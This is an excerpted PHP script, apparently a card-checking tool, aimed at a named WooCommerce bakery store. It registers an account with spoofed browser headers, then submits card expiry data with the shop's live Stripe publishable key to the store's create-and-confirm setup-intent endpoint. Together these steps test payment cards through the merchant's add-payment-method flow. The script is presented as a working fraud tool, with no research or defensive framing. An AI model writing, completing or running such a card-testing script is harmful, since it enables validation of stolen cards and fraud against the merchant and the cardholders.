...
$get_url = "https://delandbakery.com/shop/my-account/";
...
$create_url = "https://delandbakery.com/shop/my-account/";
...
$create_headers = [
    ...
    "origin: https://delandbakery.com",
    "priority: u=0, i",
    "referer: https://delandbakery.com/shop/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$create_data = http_build_query([
    ...
    "wc_order_attribution_session_entry" => "https://delandbakery.com/shop/my-account/",
    "wc_order_attribution_session_start_time" => "2025-07-06 06:50:48",
...
$pay_url = "https://delandbakery.com/shop/my-account/add-payment-method/";
...
$pay_headers = [
    ...
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://delandbakery.com/shop/my-account/add-payment-method/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$st_payload = http_build_query([
    ...
    "card[exp_month]" => $mm,
    "card[exp_year]" => $yy,
    "referrer" => "https://delandbakery.com",
    "key" => "pk_live_51HHWI5DlW6bMnf8P1AofI7AmJaLX4Z7uCmlUgMMKRd08AY5nXUz3M03xV1EWiUztaiceEFoc7QcWlv65d2VdV1eZ00TQOcLftU"
]);
...
$cseti_url = "https://delandbakery.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
